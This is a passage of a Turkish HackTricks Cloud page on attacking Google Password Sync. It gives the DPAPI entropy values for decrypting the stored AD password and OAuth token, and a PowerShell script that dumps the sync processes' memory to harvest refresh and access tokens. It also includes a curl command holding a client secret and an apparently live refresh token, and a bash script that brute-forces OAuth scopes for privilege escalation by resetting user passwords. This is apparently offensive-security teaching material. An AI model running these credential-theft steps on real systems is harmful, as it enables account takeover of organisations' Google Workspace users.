Şifrelenmiş **şifre** (varsa) **`ADPassword`** anahtarının içindedir ve **`CryptProtectData`** API'si kullanılarak şifrelenmiştir. Şifreyi çözmek için, şifre senkronizasyonunu yapılandıran kullanıcı ile aynı kullanıcı olmanız ve **`CryptUnprotectData`** kullanırken bu **entropy** değerini kullanmanız gerekir: `byte[] entropyBytes = new byte[] { 0xda, 0xfc, 0xb2, 0x8d, 0xa0, 0xd5, 0xa8, 0x7c, 0x88, 0x8b, 0x29, 0x51, 0x34, 0xcb, 0xae, 0xe9 };`

Şifrelenmiş token (varsa) **`AuthToken`** anahtarının içindedir ve **`CryptProtectData`** API'si kullanılarak şifrelenmiştir. Şifreyi çözmek için, şifre senkronizasyonunu yapılandıran kullanıcı ile aynı kullanıcı olmanız ve **`CryptUnprotectData`** kullanırken bu **entropy** değerini kullanmanız gerekir: `byte[] entropyBytes = new byte[] { 0x00, 0x14, 0x0b, 0x7e, 0x8b, 0x18, 0x8f, 0x7e, 0xc5, 0xf2, 0x2d, 0x6e, 0xdb, 0x95, 0xb8, 0x5b };`\
Ayrıca, bu değer **0123456789abcdefghijklmnopqrstv** sözlüğü ile base32hex kullanılarak kodlanmıştır.

Entropy değerleri, aracı kullanarak bulunmuştur. Araç, **`CryptUnprotectData`** ve **`CryptProtectData`** çağrılarını izlemek için yapılandırılmıştır ve ardından `PasswordSync.exe`'yi başlatmak ve izlemek için kullanılmıştır; bu, yapılandırılan şifreyi ve kimlik doğrulama token'ını başta çözmekte ve aracın **her iki durumda kullanılan entropy değerlerini** göstermektedir:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-5782633230648853886-y.jpg" alt=""><figcaption></figcaption></figure>

Bu API'lere yapılan çağrıların giriş veya çıkışında **şifrelenmiş** değerleri görmek de mümkündür (Winpeas bir noktada çalışmayı durdurursa).

Eğer Şifre Senkronizasyonu **SA kimlik bilgileri ile yapılandırılmışsa**, bu da kayıt defterinde **`HKLM\Software\Google\Google Apps Password Sync`** içinde anahtarlar olarak saklanacaktır.

### GPS - Bellekten token dökme

GCPW ile olduğu gibi, `PasswordSync.exe` ve `password_sync_service.exe` süreçlerinin belleğini dökme işlemi yapılabilir ve yenileme ve erişim token'larını bulabilirsiniz (eğer zaten oluşturulmuşlarsa).\
AD yapılandırılmış kimlik bilgilerini de bulabileceğinizi düşünüyorum.

<details>

<summary>Dök <code>PasswordSync.exe</code> ve <code>password_sync_service.exe</code> süreçlerini ve token'ları arayın</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos-local\Downloads\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Show EULA if it wasn't accepted yet for strings
$stringsPath

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$processNames = @("PasswordSync", "password_sync_service")
$chromeProcesses = Get-Process | Where-Object { $processNames -contains $_.Name } | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}
```
</details>

### GPS - Yenileme token'larından erişim token'ları oluşturma

Yenileme token'ını kullanarak, aşağıdaki komutta belirtilen istemci kimliği ve istemci sırrı ile erişim token'ları oluşturmak mümkündür:
```bash
curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
https://www.googleapis.com/oauth2/v4/token
```
### GPS - Kapsamlar

{% hint style="info" %}
Bir refresh token'a sahip olsanız bile, erişim token'ı için herhangi bir kapsam talep etmek mümkün değildir çünkü yalnızca **erişim token'ını oluşturduğunuz uygulama tarafından desteklenen kapsamları talep edebilirsiniz**.

Ayrıca, refresh token her uygulamada geçerli değildir.
{% endhint %}

Varsayılan olarak GPS, kullanıcı olarak her olası OAuth kapsamına erişime sahip olmayacaktır, bu nedenle aşağıdaki betiği kullanarak `refresh_token` ile bir `access_token` oluşturmak için kullanılabilecek kapsamları bulabiliriz:

<details>

<summary>Kapsamları brute-force yapmak için Bash betiği</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=812788789386-chamdrfrhd1doebsrcigpkb3subl7f6l.apps.googleusercontent.com" \
--data "client_secret=4YBz5h_U12lBHjf4JqRQoQjA" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03pJpHDWuak63CgYIARAAGAMSNwF-L9IrfLo73ERp20Un2c9KlYDznWhKJOuyXOzHM6oJaO9mqkBx79LjKOdskVrRDGgvzSCJY78" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

Ve yazma anında aldığım çıktı şuydu:
```
https://www.googleapis.com/auth/admin.directory.user
```
Hangi, herhangi bir kapsam belirtmediğinizde aldığınızla aynıdır.

{% hint style="danger" %}
Bu kapsam ile **mevcut bir kullanıcının şifresini değiştirerek ayrıcalıkları artırabilirsiniz**.
{% endhint %}

## Referanslar

* [https://www.youtube.com/watch?v=FEQxHRRP\_5I](https://www.youtube.com/watch?v=FEQxHRRP\_5I)
* [https://issues.chromium.org/issues/40063291](https://issues.chromium.org/issues/40063291)

{% hint style="success" %}
AWS Hacking'i öğrenin ve pratik yapın:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve pratik yapın: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.

</details>
{% endhint %}
